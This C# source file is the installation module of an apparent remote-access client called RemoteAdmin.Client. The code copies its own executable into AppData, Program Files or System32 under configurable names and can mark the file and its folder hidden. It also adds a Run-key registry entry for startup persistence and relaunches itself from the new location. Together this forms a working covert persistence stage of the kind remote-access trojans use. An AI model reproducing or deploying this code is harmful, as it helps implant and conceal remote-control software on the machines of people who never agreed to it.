using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;
using RemoteAdmin.Client.Config;

namespace RemoteAdmin.Client.Modules
{
    public static class InstallationManager
    {
        public static bool PerformInstallation()
        {
            try
            {
                // Check if installation is enabled
                if (!ClientConfig.InstallClient)
                {
                    Console.WriteLine("Installation disabled in configuration");
                    return false;
                }

                // Get current executable path
                // For single-file apps, Assembly.GetExecutingAssembly().Location returns empty
                // Use Environment.ProcessPath or AppContext.BaseDirectory instead
                string currentPath = GetCurrentExecutablePath();

                if (string.IsNullOrEmpty(currentPath))
                {
                    Console.WriteLine("ERROR: Could not determine current executable path");
                    return false;
                }

                Console.WriteLine($"Current path: {currentPath}");

                string installPath = GetInstallationPath();
                Console.WriteLine($"Target install path: {installPath}");

                // Check if already installed at the correct location
                if (IsAlreadyInstalled(currentPath, installPath))
                {
                    Console.WriteLine("Already running from installation directory");

                    // Still handle startup even if already installed
                    if (ClientConfig.InstallOnStartup)
                    {
                        InstallStartup(installPath);
                    }

                    return true;
                }

                Console.WriteLine($"Installing to: {installPath}");

                // Create installation directory
                string installDir = Path.GetDirectoryName(installPath);
                if (!Directory.Exists(installDir))
                {
                    Directory.CreateDirectory(installDir);
                    Console.WriteLine($"Created directory: {installDir}");
                }

                // Copy executable to installation location
                File.Copy(currentPath, installPath, overwrite: true);
                Console.WriteLine("Executable copied successfully");

                // Set file attributes if configured
                if (ClientConfig.SetFileHidden)
                {
                    File.SetAttributes(installPath, File.GetAttributes(installPath) | FileAttributes.Hidden);
                    Console.WriteLine("File set to hidden");
                }

                // Set subdirectory attributes if configured
                if (ClientConfig.SetSubDirHidden)
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(installDir);
                    dirInfo.Attributes |= FileAttributes.Hidden;
                    Console.WriteLine("Subdirectory set to hidden");
                }

                if (ClientConfig.InstallOnStartup)
                {
                    InstallStartup(installPath);
                }

                // Start the installed copy
                Console.WriteLine("Starting installed copy...");
                System.Diagnostics.Process.Start(installPath);

                // Exit current process
                Environment.Exit(0);

                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Installation failed: {ex.Message}");
                Console.WriteLine($"Stack trace: {ex.StackTrace}");
                return false;
            }
        }

        /// <summary>
        /// Gets the path to the currently running executable.
        /// Handles both regular and single-file published apps.
        /// </summary>
        private static string GetCurrentExecutablePath()
        {
            // Method 1: Environment.ProcessPath (preferred for .NET 5+)
            string path = Environment.ProcessPath;
            if (!string.IsNullOrEmpty(path) && File.Exists(path))
            {
                Console.WriteLine($"Using Environment.ProcessPath: {path}");
                return path;
            }

            // Method 2: Assembly.GetExecutingAssembly().Location
            // This works for non-single-file apps
            path = Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(path) && File.Exists(path))
            {
                // For single-file, Location might be a .dll path, replace with .exe
                if (path.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                {
                    path = path.Substring(0, path.Length - 4) + ".exe";
                }

                if (File.Exists(path))
                {
                    Console.WriteLine($"Using Assembly.Location: {path}");
                    return path;
                }
            }

            // Method 3: AppContext.BaseDirectory + process name
            // This is a fallback for edge cases
            try
            {
                string baseDir = AppContext.BaseDirectory;
                string processName = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                path = Path.Combine(baseDir, processName + ".exe");

                if (File.Exists(path))
                {
                    Console.WriteLine($"Using AppContext.BaseDirectory: {path}");
                    return path;
                }
            }
            catch { }

            // Method 4: Use System.Diagnostics.Process
            try
            {
                using (var process = System.Diagnostics.Process.GetCurrentProcess())
                {
                    path = process.MainModule?.FileName;
                    if (!string.IsNullOrEmpty(path) && File.Exists(path))
                    {
                        Console.WriteLine($"Using Process.MainModule.FileName: {path}");
                        return path;
                    }
                }
            }
            catch { }

            Console.WriteLine("ERROR: All methods to get executable path failed!");
            return null;
        }

        private static string GetInstallationPath()
        {
            string basePath;

            // Trim nulls from config values
            string location = ClientConfig.InstallLocation?.TrimEnd('\0') ?? "AppData";
            string subDir = ClientConfig.InstallSubDirectory?.TrimEnd('\0') ?? "SubDir";
            string name = ClientConfig.InstallName?.TrimEnd('\0') ?? "Client";

            switch (location)
            {
                case "AppData":
                    basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    break;

                case "ProgramFiles":
                    basePath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                    break;

                case "System":
                    basePath = Environment.GetFolderPath(Environment.SpecialFolder.System);
                    break;

                default:
                    basePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                    break;
            }

            string fullPath = Path.Combine(basePath, subDir, name + ".exe");
            return fullPath;
        }

        /// <summary>
        /// Checks if the application is already running from the installation directory
        /// </summary>
        private static bool IsAlreadyInstalled(string currentPath, string installPath)
        {
            try
            {
                // Normalize paths for comparison
                string normalizedCurrent = Path.GetFullPath(currentPath).ToLowerInvariant();
                string normalizedInstall = Path.GetFullPath(installPath).ToLowerInvariant();

                Console.WriteLine($"Comparing paths:");
                Console.WriteLine($"  Current:  {normalizedCurrent}");
                Console.WriteLine($"  Install:  {normalizedInstall}");
                Console.WriteLine($"  Match: {normalizedCurrent == normalizedInstall}");

                return normalizedCurrent == normalizedInstall;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error comparing paths: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Adds the application to Windows startup
        /// </summary>
        public static void InstallStartup(string exePath = null)
        {
            try
            {
                if (string.IsNullOrEmpty(exePath))
                {
                    exePath = GetCurrentExecutablePath();
                }

                if (string.IsNullOrEmpty(exePath))
                {
                    Console.WriteLine("Cannot install to startup: exe path is empty");
                    return;
                }

                string startupName = ClientConfig.StartupName?.TrimEnd('\0');
                if (string.IsNullOrWhiteSpace(startupName))
                {
                    startupName = "Client";
                }

                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue(startupName, exePath);
                        Console.WriteLine($"Added to startup as '{startupName}' -> '{exePath}'");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error installing to startup: {ex.Message}");
            }
        }

        /// <summary>
        /// Removes the application from Windows startup
        /// </summary>
        public static void UninstallStartup()
        {
            try
            {
                string startupName = ClientConfig.StartupName?.TrimEnd('\0');
                if (string.IsNullOrWhiteSpace(startupName))
                {
                    startupName = "Client";
                }

                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (key != null)
                    {
                        key.DeleteValue(startupName, false);
                        Console.WriteLine($"Removed from startup: '{startupName}'");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error removing from startup: {ex.Message}");
            }
        }

        /// <summary>
        /// Completely uninstalls the application
        /// </summary>
        public static void Uninstall()
        {
            try
            {
                // Remove from startup
                UninstallStartup();

                // Get installation path
                string installPath = GetInstallationPath();
                string installDir = Path.GetDirectoryName(installPath);

                // Delete the executable
                if (File.Exists(installPath))
                {
                    File.Delete(installPath);
                    Console.WriteLine($"Deleted: {installPath}");
                }

                // Delete the directory if empty
                if (Directory.Exists(installDir) && Directory.GetFiles(installDir).Length == 0)
                {
                    Directory.Delete(installDir);
                    Console.WriteLine($"Deleted directory: {installDir}");
                }

                Console.WriteLine("Uninstallation complete");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error during uninstallation: {ex.Message}");
            }
        }
    }
}